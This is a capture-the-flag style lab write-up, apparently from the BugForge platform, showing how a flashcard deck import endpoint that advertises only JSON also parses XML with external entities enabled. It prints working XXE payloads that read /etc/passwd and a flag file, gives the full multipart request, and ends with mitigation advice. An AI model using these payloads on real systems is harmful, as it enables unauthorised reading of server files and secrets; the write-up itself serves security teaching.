---
title: "XML External Entity (XXE) via Deck Import Feature | Tanuki"
date: 2026-05-06 00:00:00 +0530
categories: [Web Security, XXE]
tags: [xxe, xml, file-read, insecure-parser, bugforge, api-testing, content-type-bypass]
platform: BugForge
author: Shivansh Sharma
image:
  path: /assets/images/posts/tanuki-file-upload-xml.webp
  alt: XML External Entity exploitation through deck import functionality
---

## Overview

While exploring the application's functionality, I discovered a feature that allowed users to import custom flashcard decks.

The import page accepted uploaded deck files and also provided a downloadable sample format for users.

```
https://lab-1778141961942-ngsauy.labs-app.bugforge.io/import
```

The provided sample used JSON format.

---

## Objective

Determine whether the deck import functionality properly validated uploaded file types and securely parsed user-controlled data.

The goal was to test whether alternative content types such as XML could be processed by the backend parser, potentially leading to XML External Entity (XXE) injection.

---

## Reconnaissance

The application provided the following sample deck format:

```json
{
  "name": "Sample Deck",
  "description": "A sample deck showing the import format for custom flashcards",
  "category": "Example",
  "cards": [
    {
      "front": "What is the capital of France?",
      "back": "Paris - the city of lights and capital of France since 987 AD."
    },
    {
      "front": "What programming language is this app built with?",
      "back": "JavaScript - using Node.js for backend and React for frontend."
    }
  ]
}
```

The upload request looked like this:

```http
POST /api/decks/import HTTP/2
Host: lab-1778141961942-ngsauy.labs-app.bugforge.io
Content-Type: multipart/form-data
```

The uploaded file was sent as multipart form-data with the following content type:

```
Content-Type: application/json
```

At this point, I started wondering whether the backend relied only on the provided Content-Type header and whether it might also support XML parsing internally.

---

## Testing XML Support

I modified the uploaded file format from JSON to XML and changed the uploaded file content type accordingly.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<deck>
    <name>Sample Deck</name>
    <description>A sample deck showing the import format for custom flashcards</description>
    <category>Example</category>

    <cards>
        <card>
            <front>What is the capital of France?</front>
            <back>Paris - the city of lights and capital of France since 987 AD.</back>
        </card>

        <card>
            <front>How do you create a custom deck?</front>
            <back>Download this sample file, edit the name, description, category, and cards array with your own content, then upload it using the Import Deck feature.</back>
        </card>
    </cards>
</deck>
```

The server accepted the XML file successfully.

This confirmed that the backend parser supported XML processing despite the application originally advertising JSON imports only.

---

## Exploitation

Since the application processed XML input, the next step was testing for XML External Entity (XXE) injection.

I introduced a custom external entity referencing `/etc/passwd`.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE deck [
  <!ELEMENT deck ANY>
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
```

Then I injected the entity into the XML document:

```xml
<deck>
    <name>&xxe;</name>
    <description>XXE Test</description>
    <category>Example</category>

    <cards>
        <card>
            <front>Test</front>
            <back>Testing XXE</back>
        </card>
    </cards>
</deck>
```

The final request:

```http
POST /api/decks/import HTTP/2
Host: lab-1778141961942-ngsauy.labs-app.bugforge.io
Content-Type: multipart/form-data

------BOUNDARY
Content-Disposition: form-data; name="file"; filename="sample-deck.xml"
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE deck [
  <!ELEMENT deck ANY>
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>

<deck>
    <name>&xxe;</name>
    <description>XXE Test</description>
    <category>Example</category>

    <cards>
        <card>
            <front>Test</front>
            <back>Testing XXE</back>
        </card>
    </cards>
</deck>

------BOUNDARY--
```

The server processed the request successfully:

```json
{
  "id": 5,
  "message": "Deck imported successfully",
  "cards_count": 1
}
```

This confirmed that:

- XML input was accepted
- External entities were processed
- Arbitrary file reads were possible

---

## Proof of Exploitation

After confirming XXE behavior using `/etc/passwd`, I targeted the challenge flag file.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE deck [
  <!ELEMENT deck ANY>
  <!ENTITY xxe SYSTEM "file://flag.txt">
]>
```

Injected payload:

```xml
<deck>
    <name>&xxe;</name>
    <description>XXE Test</description>
    <category>Example</category>

    <cards>
        <card>
            <front>Test</front>
            <back>Testing XXE</back>
        </card>
    </cards>
</deck>
```

The application resolved the external entity and exposed the flag:

```
bug{oXtzp3EObHo6mdijUJYTLEulLQq2T8e6}
```

---

## Root Cause

The vulnerability existed because the backend XML parser was configured insecurely.

The application:

- Accepted XML uploads unexpectedly
- Trusted user-controlled content types
- Parsed XML documents with external entities enabled
- Failed to disable DTD processing

This allowed attackers to force the server into reading local files from the filesystem.

---

## Impact

Successful exploitation of XXE vulnerabilities can lead to:

- Arbitrary file disclosure
- Sensitive configuration leakage
- Source code exposure
- Internal network interaction (SSRF)
- Cloud metadata access
- Credential disclosure
- Denial of service via entity expansion attacks

In real-world environments, XXE vulnerabilities often expose secrets such as:

- `.env` files
- SSH keys
- Database credentials
- API tokens
- Kubernetes secrets
- AWS metadata credentials

---

## Mitigation

**Disable External Entity Processing**

XML parsers should disable:

- DTD processing
- External entities
- External schema loading

**Strict File Validation**

Only allow explicitly supported formats such as JSON.

Reject:

- XML uploads
- Unexpected MIME types
- Polyglot payloads

**Use Secure Parsers**

Use hardened XML parsing libraries configured securely by default.

**Input Validation**

Validate uploaded content structure before processing.

---

## Real-World Insight

XXE vulnerabilities remain common in:

- File import features
- SOAP APIs
- SVG uploads
- Office document parsers
- SAML processing
- Mobile backend services

A common mistake developers make is assuming XML support is harmless while forgetting that many XML parsers automatically resolve external entities unless explicitly disabled.

This challenge was a classic example of how changing a single Content-Type header can completely alter backend behavior and expose hidden attack surfaces.